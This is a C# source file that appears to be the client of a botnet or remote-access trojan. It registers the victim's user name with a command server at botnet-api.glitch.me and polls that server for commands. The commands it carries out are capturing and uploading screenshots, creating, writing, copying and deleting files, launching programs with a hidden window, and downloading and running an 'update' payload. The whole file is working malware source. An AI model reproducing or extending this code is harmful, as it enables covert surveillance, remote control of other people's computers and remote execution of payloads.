using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Http;
using System.Web.Script.Serialization;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;

namespace CommandHandler
{
    public class Upd
    {
        public uint id { get; set; }
        public string filename { get; set; }
        public byte[] filebytes { get; set; }
    }
    public class Product
    {
        public string nameofpc { get; set; }
    }
    public class ScreenC
    {
        public byte[] bytes { get; set; }
    }
    public class FileC
    {
        public string fileformat { get; set; }
        public byte[] file { get; set; }
    }
    public class Command
    {
        public uint id { get; set; }
        public string command { get; set; }
        public uint[] ids { get; set; }
    }
    public class Response
    {
        public string response { get; set; }
    }
    public class HttpHandler:Commands
    {
        //public static async Task<string> SendFilePathAsync(string ip)
        //{
        //    HttpClient client = new HttpClient();
        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
        //    string pth = null;
        //    var resp = await client.GetAsync($"/api/v1/getfilespath/{ip}");
        //    if (resp.IsSuccessStatusCode)
        //    {
        //        pth = await resp.Content.ReadAsAsync<string>();
        //        return pth;
        //    }
        //    else
        //    {
        //        return pth;
        //    }
        //}
        //public static async Task SendFileAsync(uint id, string ip, string path, byte[] bt)
        //{
        //    //HttpClient client = new HttpClient();
        //    //client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
        //    //List<byte[]> btlist = new List<byte[]>();
        //    //int value = 0;
        //    //for (int i = 0; i < (bt.Length / 20000) + 1; i++)
        //    //{
        //    //    if (bt.Length - value > 20000)
        //    //    {
        //    //        byte[] btt = new byte[20000];
        //    //        btlist.Add(btt);
        //    //        Array.ConstrainedCopy(bt, value, btlist[i], 0, 20000);
        //    //        value += 20000;
        //    //    }
        //    //    else
        //    //    {
        //    //        byte[] btt = new byte[bt.Length - value];
        //    //        btlist.Add(btt);
        //    //        Array.ConstrainedCopy(bt, value, btlist[i], 0, bt.Length - value);
        //    //    }
        //    //}
        //    //for (int i = 0; i < btlist.Count; i++)
        //    //{
        //    //    if (i == 0)
        //    //    {
        //    //        FileC screen = new FileC {  = btlist[i] };
        //    //        string json = new JavaScriptSerializer().Serialize(screen);
        //    //        respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
        //    //        respgl.EnsureSuccessStatusCode();
        //    //        sid = respgl.Content.ReadAsStringAsync().Result;
        //    //    }
        //    //    else
        //    //    {
        //    //        ScreenC screen = new ScreenC { bytes = btlist[i] };
        //    //        string json = new JavaScriptSerializer().Serialize(screen);
        //    //        var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
        //    //        resp.EnsureSuccessStatusCode();
        //    //    }
        //    //}
        //} //В разработке
        //public static async Task<byte[]> GetFileAsync(string Ip)
        //{
        //    HttpClient client = new HttpClient();
        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
        //    var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
        //    byte[] bt = new byte[104857600];
        //    if (response.IsSuccessStatusCode)
        //    {
        //        bt = await response.Content.ReadAsAsync<byte[]>();
        //        return bt;
        //    }
        //    else
        //    {
        //        return bt;
        //    }
        //}
        //public static async Task<string> GetFilePathAsync(string Ip)
        //{
        //    HttpClient client = new HttpClient();
        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
        //    var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
        //    string res = null;
        //    if (response.IsSuccessStatusCode)
        //    {
        //        res = await response.Content.ReadAsAsync<string>();
        //        return res;
        //    }
        //    else
        //    {
        //        return res;
        //    }
        //}

        public static async Task<string> getFileName()
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            HttpResponseMessage resp = await client.GetAsync($"/api/v1/update");
            if (resp.IsSuccessStatusCode)
            {
                var upd = await resp.Content.ReadAsAsync<Upd>();
                return upd.filename;
            }
            else
            {
                throw new Exception();
            }
        }
        public static async Task<byte[]> getFileBytes()
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            HttpResponseMessage resp = await client.GetAsync($"/api/v1/update");
            if (resp.IsSuccessStatusCode)
            {
                var upd = await resp.Content.ReadAsAsync<Upd>();
                return upd.filebytes;
            }
            else
            {
                throw new Exception();
            }
        }
        public static async Task ScreenSendAsync(string Id, byte[] bt)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            List<byte[]> btlist = new List<byte[]>();
            int value = 0;
            string sid;
            HttpResponseMessage respgl = null;
            for (int i = 0; i < (bt.Length/20000)+1; i++)
			{
                if (bt.Length-value>20000)
	            {
                    byte[] btt = new byte[20000];
                    btlist.Add(btt);
                    Array.ConstrainedCopy(bt,value,btlist[i],0,20000);
                    value+=20000;
	            }
                else
	            {
                    byte[] btt = new byte[bt.Length-value];
                    btlist.Add(btt);
                    Array.ConstrainedCopy(bt,value,btlist[i],0,bt.Length - value);
	            }
			}
            for (int i = 0; i < btlist.Count; i++)
			{
                if (i==0)
	            {
                    ScreenC screen = new ScreenC{ bytes = btlist[i]};
                    string json = new JavaScriptSerializer().Serialize(screen);
                    respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
                    respgl.EnsureSuccessStatusCode();
                    sid = respgl.Content.ReadAsStringAsync().Result;
	            }
                else
	            {
                    ScreenC screen = new ScreenC{ bytes = btlist[i]};
                    string json = new JavaScriptSerializer().Serialize(screen);
                    var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
                    resp.EnsureSuccessStatusCode();
	            }
			}
        }
        public static async Task IpDeleteAsync(string Id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            await client.DeleteAsync($"/api/v1/client/{Id}");
        }
        public static async Task SendResponse(string result, string MyId)
        {
            HttpClient client = new HttpClient();
            Response response = new Response {response = result};
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            string json = new JavaScriptSerializer().Serialize(response);
            var resp = client.PostAsync($"/api/v1/responses/{MyId}", new StringContent(json)).Result;
            resp.EnsureSuccessStatusCode();
        }
        public static async Task<UInt32> GetIdOfCommand(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            uint idofcommands = 0;
            var response = client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                idofcommands = await response.Content.ReadAsAsync<UInt32>();
                return idofcommands;
            }
            else
            {
                return idofcommands;
            }
        }
        public static async Task<UInt32> IdResult()
        {
            uint id = await GetIdOfCommand($"/api/v1/messages");
            return id;
        }

        public static async Task<T> GetCommandAssync<T>(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            T command = default(T);
            var response = client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                command = await response.Content.ReadAsAsync<T>();
                return command;
            }
            else
            {
                return command;
            }
        }
        public static async Task<UInt32> ResultIdCmd(string id)
        {
            var idcmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            uint rescmd = idcmd.id;
            return rescmd;
        }
        public static async Task<List<string>> ResultIdsCmdAsync(string id)
        {
            var ipcmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            List<string> ipaddressescmd = new List<string> { };
            for (int i = 0; i < GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ids.Length; i++)
            {
                ipaddressescmd.Add(GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ids[i].ToString());
            }
            return ipaddressescmd;
        }
        public static async Task<string> ResultCmd(string id)
        {
            var cmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            string rescmd = cmd.command;
            return rescmd;
        }
        static async Task<T> GetProductAsync<T>(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            T product = default(T);
            var response = client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                product = await response.Content.ReadAsAsync<T>();
            }
            response = null;
            return product;
        }
        public static async Task<UInt32> CreateIpAndIdAsync(string ip)
        {
            HttpClient client = new HttpClient();
            Product product = new Product {nameofpc = Environment.UserName};
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            string json = new JavaScriptSerializer().Serialize(product);
            HttpResponseMessage response = client.PostAsync("api/v1/client", new StringContent(json)).Result;
            uint answer = response.Content.ReadAsAsync<UInt32>().Result;
            return answer;
        }

    }
    public class Commands
    {
        public static void code1(string command1, string command2)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command1.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmdr1 != null)
            {
                File.Create(cmdr1).Close();
                File.WriteAllText(cmdr1, command2);
            }
            else
            {
                File.Create(command1).Close();
                File.WriteAllText(command1, command2);
            }
        }
        public static void code2(string command1, string command2)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command1.Split('\\');
            string cmd2 = null;
            string cmdr2 = null;
            string[] cmd2sp = command2.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmd2sp[0] == "%currentuser%")
            {
                cmd2 = "C:\\Users\\" + Environment.UserName;
                cmdr2 += cmd2;
                for (int i = 1; i < cmd2sp.Length; i++)
                {
                    cmdr2 = cmdr2 + "\\" + cmd2sp[i];
                }
            }
            if (cmdr1 != null && cmdr2 != null)
            {
                File.Copy(cmdr1, cmdr2);
            }
            else
            {
                File.Copy(command1, command2);
            }
        }
        public static void code3(string command)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmdr1 != null)
            {
                File.Create(cmdr1).Close();
            }
            else
            {
                File.Create(command).Close();
            }
        }
        public static void code4(string command)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmdr1 != null)
            {
                File.Delete(cmdr1);
            }
            else
            {
                File.Delete(command);
            }
        }
        public static byte[] code5()
        {
            var size = Screen.PrimaryScreen.Bounds.Size;
            Bitmap bmp = new Bitmap(size.Width, size.Height);
            Graphics graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, new Size(size.Width, size.Height));
            graph.InterpolationMode = InterpolationMode.Bicubic;
            MemoryStream ms = new MemoryStream();
            Bitmap bmpToSend = new Bitmap(bmp, 1280, 720);
            Graphics graphToSend = Graphics.FromImage(bmpToSend);
            graphToSend.CompositingQuality = CompositingQuality.HighQuality;
            graphToSend.SmoothingMode = SmoothingMode.HighQuality;
            graphToSend.InterpolationMode = InterpolationMode.HighQualityBicubic;
            graphToSend.InterpolationMode = InterpolationMode.Bicubic;
            bmpToSend.Save(ms, ImageFormat.Jpeg);
            byte[] imagebt = new byte[3110400];
            imagebt = ms.ToArray();
            return imagebt;
        }
        public static void code6(string command)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmdr1 != null)
            {
                var command1 = new ProcessStartInfo
                {
                    FileName = cmdr1,
                    ErrorDialog = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(command1);
            }
            else
            {
                var command1 = new ProcessStartInfo
                {
                    FileName = command,
                    ErrorDialog = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(command1);
            }

        }
        public static void code7(string command)
        {
            string cmd1 = null;
            string cmdr1 = null;
            string[] cmd1sp = command.Split('\\');
            if (cmd1sp[0] == "%currentuser%")
            {
                cmd1 = "C:\\Users\\" + Environment.UserName;
                cmdr1 += cmd1;
                for (int i = 1; i < cmd1sp.Length; i++)
                {
                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
                }
            }
            if (cmdr1 != null)
            {
                Process.Start(cmdr1);
            }
            else
            {
                Process.Start(@command);
            }
        }
        public static byte[] codeToSend(string path)
        {
            byte[] bytearray = File.ReadAllBytes(path);
            return bytearray;
        }
        public static void codeToGet(byte[] file, string path)
        {
            File.Create(path).Write(file, 0, file.Length);
        }
        public static string code8()
        {
            return String.Format("Name Of PC: " + System.Environment.UserName);
        }
        public static void updatecommand(string id)
        {
            File.Create("C:\\ProgramData\\idbtcU.txt").Close();
            File.WriteAllText("C:\\ProgramData\\idbtcU.txt", id);
            byte[] filebytes = HttpHandler.getFileBytes().Result;
            Directory.CreateDirectory(Environment.CurrentDirectory.ToString() + $"\\Update\\{DateTime.Today.ToLongDateString()}");
            File.WriteAllBytes(Environment.CurrentDirectory.ToString() + $"\\Update\\{DateTime.Today.ToLongDateString()}"+
                $"\\{HttpHandler.getFileName().Result}", filebytes);
            Process.Start(Environment.CurrentDirectory.ToString() + "\\Updater.exe");
            Environment.Exit(0);
        }
    }
    public class Class1:HttpHandler
    { 
        public static string Main(string cmd, string path1, string path2, uint idc)
        {
            string a = null;
            #region handler
            switch (cmd)
            {
                case "screen":
                    ScreenSendAsync(idc.ToString(), code5()).Wait();
                    break;
                case "startinvis":
                    code6(path1);
                    break;
                case "nameofpc":
                    a = code8();
                    break;
                case "createwrite":
                    code1(path1, path2);
                    break;
                case "start":
                    code7(path1);
                    break;
                case "create":
                    code3(path1);
                    break;
                case "delete":
                    code4(path1);
                    break;
                case "copy":
                    code2(path1, path2);
                    break;
                case "update":
                    updatecommand(idc.ToString());
                    break;
                default:
                    return ("Команда введена неверно или отсуствует у клиента");
            }
            return a;
            #endregion
        }
    }
}
